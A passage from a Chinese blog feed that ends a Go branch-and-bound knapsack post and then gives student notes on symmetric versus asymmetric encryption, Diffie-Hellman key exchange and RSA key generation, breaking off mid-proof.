<span class="number">1</span>,</span><br><span class="line">weight: node.weight + weights[node.level+<span class="number">1</span>], <span class="comment">// 加上当前物品的重量</span></span><br><span class="line">value:  node.value + values[node.level+<span class="number">1</span>]&#125;</span><br><span class="line">leftNode.bound = bound(leftNode, n, W, weights, values)</span><br><span class="line"><span class="keyword">if</span> leftNode.weight &lt;= W &amp;&amp; leftNode.value &gt; maxValue &#123;</span><br><span class="line">maxValue = leftNode.value</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> leftNode.bound &gt; maxValue &#123; <span class="comment">// 如果左节点的价值上界大于最大值</span></span><br><span class="line">heap.Push(&amp;queue, leftNode) <span class="comment">// 加入左节点到队列中</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rightNode := Node&#123; <span class="comment">// 右节点代表不选择当前物品</span></span><br><span class="line">level:  node.level + <span class="number">1</span>,</span><br><span class="line">weight: node.weight,</span><br><span class="line">value:  node.value&#125;</span><br><span class="line">rightNode.bound = bound(rightNode, n, W, weights, values) <span class="comment">// 计算右节点的价值上界</span></span><br><span class="line"><span class="keyword">if</span> rightNode.bound &gt; maxValue &#123;                           <span class="comment">// 如果右节点的价值上界大于最大值，事实上永远都可以进入右节点</span></span><br><span class="line">heap.Push(&amp;queue, rightNode) <span class="comment">// 加入右节点到队列中</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> maxValue</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//输入物品数量</span></span><br><span class="line"><span class="keyword">var</span> n <span class="type">int</span></span><br><span class="line">fmt.Scan(&amp;n)</span><br><span class="line"><span class="comment">//输入背包容量</span></span><br><span class="line"><span class="keyword">var</span> W <span class="type">int</span></span><br><span class="line">fmt.Scan(&amp;W)</span><br><span class="line"><span class="comment">//输入物品重量</span></span><br><span class="line"><span class="keyword">var</span> weights = <span class="built_in">make</span>([]<span class="type">float64</span>, n)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">fmt.Scan(&amp;weights[i])</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输入物品价值</span></span><br><span class="line"><span class="keyword">var</span> values = <span class="built_in">make</span>([]<span class="type">float64</span>, n)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">fmt.Scan(&amp;values[i])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">result := knapsack01(n, <span class="type">float64</span>(W), weights, values)</span><br><span class="line">fmt.Println(<span class="string">&quot;Maximum value that can be obtained is:&quot;</span>, result)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不同于回溯法，我们在分支限界法一般都需要显示的指定树的数据结构，因为涉及到树的层次遍历（宽度优先搜索）。</p><p>这里的重点是限界函数的应用，值得仔细揣摩。</p><h1 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章"></a> 参考文章</h1><p><a href="https://zhuanlan.zhihu.com/p/93530380">回溯算法套路详解 - 知乎 (zhihu.com)</a></p><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/IMG_20240609_195030.jpg" alt="IMG_20240609_195030" /></p>]]></content>
      
      
      <categories>
          
          <category> 算法笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 回溯法 </tag>
            
            <tag> 分支限界法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈非对称加密</title>
      <link href="/posts/da529aaa87b3/"/>
      <url>/posts/da529aaa87b3/</url>
      
        <content type="html"><![CDATA[<h1 id="浅谈非对称加密"><a class="markdownIt-Anchor" href="#浅谈非对称加密"></a> 浅谈非对称加密</h1><p>课程作业要求，简单的归纳关于Diffie-Hellman密钥交换技术、RSA加密以及椭圆曲线的一些基本知识点。</p><h2 id="对称加密与非对称加密"><a class="markdownIt-Anchor" href="#对称加密与非对称加密"></a> 对称加密与非对称加密</h2><p>密码学发展至今是有一个过程的，从最基本的隐写术开始，到古典密码，再到近现代密码。在过去人们主要研究的是对称加密，即在密码算法足够强大的基础上，通过对密钥的保密实现加密交流。比如DES、AES等密码都属于对称密码。</p><p>对称密码有如下特点：</p><p>优点：加解密处理速度快、保密度高。</p><p>缺点：</p><ul><li>如何安全的传输密钥到收信方是一个问题。</li><li>多人通信时密钥组合的数量会出现爆炸性膨胀。</li><li>双方必须统一密钥，如果收信人与发信人素不相识，就无法向对方发送加密信息</li><li>存在数字签名困难问题，即消息可能被伪造</li></ul><p>于是我们引入了非对称加密，非对称加密给密码学注入了新的活力，开辟出了一片富有探索价值的新区域。非对称加密即发信方与收信方不共享同一密钥，而是分别保存各自的私钥，用对方的公钥进行通信。</p><p>非对称加密有如下特点：</p><p>优点：</p><ul><li>网络中的每一个用户只需要保存自己的私钥，密钥少，便于管理</li><li>密钥分配简单，不需要秘密的通道和复杂的协议来传送密钥</li><li>可以实现数字签名</li></ul><p>缺点：加密、解密的速度相对较慢，同等安全强度下所要求的密钥位数多一些</p><p>一般来说，我们在密钥分发时采取非对称加密交换密钥，建立起加密通信通道后就采用对称加密进行通信。这样既解决了对称加密密钥分发的问题，又解决了非对称加密速度慢的问题。</p><p>非对称加密和对称加密的区别整理如下表：</p><table><thead><tr><th>分类</th><th>对称密码体制</th><th>非对称密码体制</th></tr></thead><tbody><tr><td>运行条件</td><td>加密和解密使用同一个密钥和同一个算法；发送方和接受方必须共享密钥和算法</td><td>用同一个算法进行加解密，但是密钥有一对，其中一个用于加密，一个用于解密；发送方和接受方每个使用一对相互匹配而彼此互异的密钥中的一个。</td></tr><tr><td>安全条件</td><td>密钥必须保密；仅根据密文解密明文是不可能或不现实的；已知算法和密文无法确定密钥</td><td>密钥对中的私钥必须保密；仅根据密文解密明文是不可能或不现实的；已知算法、密文和公钥无法确定私钥</td></tr><tr><td>保密方式</td><td>基于发送方和接受方共享的密钥</td><td>基于接收方个人的私钥</td></tr><tr><td>基本变换</td><td>面向符号（字符或位）的代替或换位</td><td>面向数字的数学函数变换</td></tr><tr><td>适用范围</td><td>消息的保密</td><td>用于短消息的保密（如对称加密中的密钥交换），或认证、数字签名等</td></tr></tbody></table><h2 id="diffie-hellman密钥交换"><a class="markdownIt-Anchor" href="#diffie-hellman密钥交换"></a> Diffie-Hellman密钥交换</h2><table><thead><tr><th></th><th>Alice</th><th></th><th></th><th>Bob</th><th></th></tr></thead><tbody><tr><td></td><td>秘密信息</td><td>公开信息</td><td></td><td>公开信息</td><td>秘密信息</td></tr><tr><td>A和B首先约定两个公开的整数p和a</td><td></td><td>p, a</td><td></td><td>p, a</td><td></td></tr><tr><td>A、B各自随机产生两个数X<sub>A</sub>、X<sub>B</sub>，作为自己的私钥</td><td>X<sub>A</sub></td><td></td><td></td><td></td><td>X<sub>B</sub></td></tr><tr><td>A、B各自计算自己的公钥Y<sub>A</sub>、Y<sub>B</sub></td><td>计算</td><td>Y<sub>A</sub></td><td></td><td>Y<sub>B</sub></td><td>计算</td></tr><tr><td></td><td>Y<sub>A</sub>=a^X<sub>A</sub> mod p</td><td></td><td></td><td></td><td>Y<sub>B</sub>=a^X<sub>B</sub> mod p</td></tr><tr><td>交换公钥Y<sub>A</sub>、Y<sub>B</sub></td><td></td><td>Y<sub>B</sub></td><td></td><td>Y<sub>A</sub></td><td></td></tr><tr><td>计算出加密用的密钥K</td><td>计算</td><td></td><td></td><td></td><td>计算</td></tr><tr><td></td><td>K=(Y<sub>B</sub>)^X<sub>A</sub> mod p</td><td></td><td></td><td></td><td>K=(Y<sub>A</sub>)^X<sub>B</sub>mod p</td></tr></tbody></table><p>也即：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mo>=</mo><msup><mrow><mo fence="true">(</mo><msub><mi>Y</mi><mi mathvariant="normal">B</mi></msub><mo fence="true">)</mo></mrow><msub><mi>X</mi><mi mathvariant="normal">A</mi></msub></msup><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>p</mi><mo>=</mo><msup><mrow><mo fence="true">(</mo><msup><mi>a</mi><msub><mi>X</mi><mi mathvariant="normal">B</mi></msub></msup><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>p</mi><mo fence="true">)</mo></mrow><msub><mi>X</mi><mi mathvariant="normal">A</mi></msub></msup><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>p</mi><mo>=</mo><msup><mrow><mo fence="true">(</mo><msup><mi>a</mi><msub><mi>X</mi><mi mathvariant="normal">B</mi></msub></msup><mo fence="true">)</mo></mrow><msub><mi>X</mi><mi mathvariant="normal">A</mi></msub></msup><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>p</mi><mo>=</mo><msup><mrow><mo fence="true">(</mo><msup><mi>a</mi><msub><mi>X</mi><mi mathvariant="normal">A</mi></msub></msup><mo fence="true">)</mo></mrow><msub><mi>X</mi><mi mathvariant="normal">B</mi></msub></msup><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>p</mi><mo>=</mo><msup><mrow><mo fence="true">(</mo><msub><mi>Y</mi><mi mathvariant="normal">A</mi></msub><mo fence="true">)</mo></mrow><msub><mi>X</mi><mi mathvariant="normal">B</mi></msub></msup><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">K=\left(Y_{\mathrm{B}}\right)^{X_{\mathrm{A}}} \bmod p=\left(a^{X_{\mathrm{B}}} \bmod p\right)^{X_{\mathrm{A}}} \bmod p=\left(a^{X_{\mathrm{B}}}\right)^{X_{\mathrm{A}}} \bmod p=\left(a^{X_{\mathrm{A}}}\right)^{X_{\mathrm{B}}} \bmod p=\left(Y_{\mathrm{A}}\right)^{X_{\mathrm{B}}} \bmod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.231231em;vertical-align:-0.25em;"></span><span class="minner"><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">B</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.981231em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3567071428571427em;margin-left:-0.07847em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">A</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.14329285714285717em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.4312409999999998em;vertical-align:-0.35001em;"></span><span class="minner"><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3567071428571427em;margin-left:-0.07847em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">B</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.14329285714285717em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">p</span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0812309999999998em;"><span style="top:-3.3029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3567071428571427em;margin-left:-0.07847em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">A</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.14329285714285717em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.4312409999999998em;vertical-align:-0.35001em;"></span><span class="minner"><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3567071428571427em;margin-left:-0.07847em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">B</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.14329285714285717em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0812309999999998em;"><span style="top:-3.3029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3567071428571427em;margin-left:-0.07847em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">A</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.14329285714285717em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.4312409999999998em;vertical-align:-0.35001em;"></span><span class="minner"><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3567071428571427em;margin-left:-0.07847em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">A</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.14329285714285717em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0812309999999998em;"><span style="top:-3.3029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3567071428571427em;margin-left:-0.07847em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">B</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.14329285714285717em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.231231em;vertical-align:-0.25em;"></span><span class="minner"><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">A</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.981231em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3567071428571427em;margin-left:-0.07847em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">B</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.14329285714285717em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span></p><p>用此算法可以安全的交换通信密钥，但是有可能遭受中间人攻击篡改Bob发送的信息。</p><h3 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240605203507296.png" alt="image-20240605203507296" /></p><h2 id="rsa加密"><a class="markdownIt-Anchor" href="#rsa加密"></a> RSA加密</h2><h3 id="密钥生成"><a class="markdownIt-Anchor" href="#密钥生成"></a> 密钥生成</h3><ol><li>首先选择互异的大素数p,q，计算n=p*q，由欧拉定理计算大素数乘积的欧拉数φ(n)=(p-1)(q-1)。</li><li>选择整数e使得gcd(φ(n),e)=1，其中1&lt;e&lt;φ(n)。</li><li>计算d=e<sup>-1</sup>mod φ(n)。</li><li>此时公钥KU={e,n}</li><li>私钥={d,φ(n)}</li></ol><h3 id="算法描述"><a class="markdownIt-Anchor" href="#算法描述"></a> 算法描述</h3><ol><li><p>加密(用<em>e</em>, <em>n</em>)：对明文进行分组，使得每个分组对应的十进制数小于𝑛。对每个明文分组𝑚做加密运算：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>≡</mo><msup><mi>m</mi><mi>e</mi></msup><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c \equiv m^{e} \bmod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span></p></li><li><p>解密(用d，n)</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>≡</mo><msup><mi>c</mi><mi>d</mi></msup><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">m \equiv c^{d} \bmod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.849108em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span></p></li></ol><h3 id="证明"><a class="markdownIt-Anchor" href="#证明"></a> 证明</h3><p>我们仅验证gcd(a,n)=1的情况</p><p>对于加解密过程，我们尝试证明<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>m</mi><mi>e</mi></msup><mo>≡</mo><msup><mi>c</mi><mrow><mi>e</mi><mi>d</mi></mrow></msup><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">m^{e} \equiv c^{ed} \bmod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.849108em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal 